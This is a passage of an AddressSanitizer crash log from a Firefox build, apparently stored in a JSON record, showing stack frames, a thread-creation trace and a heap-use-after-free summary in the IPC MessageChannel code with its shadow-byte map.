0x7f8fe73a1dbe in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #27 0x7f8ff0846563 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #28 0x7f8ff4b2f120 in nsAppStartup::Run() /builds/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:271:30 #29 0x7f8ff4e2cb0a in XREMain::XRE_mainRun() /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4589:22 #30 0x7f8ff4e2f538 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4727:8 #31 0x7f8ff4e30dc9 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4811:21 #32 0x55788cd8264c in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:212:22 #33 0x55788cd8264c in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:291 #34 0x7f9009ccdb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96) Thread T41 (IPDL Background) created by T0 here: #0 0x55788cd3867d in pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:210:3 #1 0x7f900b19e613 in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7f900b18809e in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7f8fe61f26a9 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:661:8 #4 0x7f8fe61fe5d5 in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:416:12 #5 0x7f8fe6203684 in NS_NewNamedThread(nsTSubstring<char> const&, nsIThread**, nsIRunnable*, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:135:57 #6 0x7f8fe747df22 in NS_NewNamedThread<16> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:71:10 #7 0x7f8fe747df22 in (anonymous namespace)::ParentImpl::CreateBackgroundThread() /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:944 #8 0x7f8fe74845ca in RunOnMainThread /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1244:30 #9 0x7f8fe74845ca in (anonymous namespace)::ParentImpl::CreateActorHelper::Run() /builds/worker/workspace/build/src/ipc/glue/BackgroundImpl.cpp:1263 #10 0x7f8fe61f7511 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #11 0x7f8fe61ff91d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #12 0x7f8fe61f4e0e in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:881:22)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:348:25 #13 0x7f8fe61f4e0e in nsThread::Shutdown() /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:881 #14 0x7f8fe8579d0b in applyImpl<nsIThread, nsresult (nsIThread::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1122:12 #15 0x7f8fe8579d0b in apply<nsIThread, nsresult (nsIThread::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1128 #16 0x7f8fe8579d0b in mozilla::detail::RunnableMethodImpl<RefPtr<nsIThread>, nsresult (nsIThread::)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1174 #17 0x7f8fe61f7511 in nsThread::ProcessNextEvent(bool, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #18 0x7f8fe61ff91d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:482:10 #19 0x7f8fe61feed1 in SpinEventLoopUntil<mozilla::ProcessFailureBehavior::ReportToCaller, (lambda at /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:489:36)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:348:25 #20 0x7f8fe61feed1 in nsThreadManager::SpinEventLoopUntilInternal(nsINestedEventLoopCondition*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:489 #21 0x7f8fe622e891 in NS_InvokeByIndex /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:106 #22 0x7f8fe8673d57 in Invoke /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1630:10 #23 0x7f8fe8673d57 in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1178 #24 0x7f8fe8673d57 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1144 #25 0x7f8fe867bef2 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:941:10 #26 0x7f8ff5116307 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #27 0x7f8ff5116307 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #28 0x7f8ff50fe71a in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #29 0x7f8ff50fe71a in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3075 #30 0x7f8ff50e0748 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #31 0x7f8ff5116c76 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 #32 0x7f8ff51188c2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #33 0x7f8ff564c6b0 in js::fun_apply(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/JSFunction.cpp:1180:10 #34 0x7f8ff5116307 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #35 0x7f8ff5116307 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #36 0x7f8ff50fe71a in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #37 0x7f8ff50fe71a in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3075 #38 0x7f8ff50e0748 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #39 0x7f8ff5116c76 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 #40 0x7f8ff51188c2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #41 0x7f8ff5cfc427 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2558:10 #42 0x7f8fe8659012 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, nsXPTMethodInfo const*, nsXPTCMiniVariant*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedJSClass.cpp:993:17 #43 0x7f8fe622ff98 in PrepareAndDispatch /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcstubs_x86_64_linux.cpp:127:37 #44 0x7f8fe622ee6a in SharedStub (/firefox/libxul.so+0x4a09e6a) #45 0x7f8ff4e5617d in nsXREDirProvider::DoStartup() /builds/worker/workspace/build/src/toolkit/xre/nsXREDirProvider.cpp:1010:11 #46 0x7f8ff4e2bd2b in XREMain::XRE_mainRun() /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4409:16 #47 0x7f8ff4e2f538 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4727:8 #48 0x7f8ff4e30dc9 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4811:21 #49 0x55788cd8264c in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:212:22 #50 0x55788cd8264c in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:291 #51 0x7f9009ccdb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96) SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ipc/MessageChannel.h:542:5 in AssertWorkerThread Shadow bytes around the buggy address: 0x0c2e80042650: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80042660: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c2e80042670: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e80042680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80042690: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c2e800426a0: fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800426b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800426c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800426d0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c2e800426e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e800426f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==18599==ABORTING"
      }
    ]
  }
}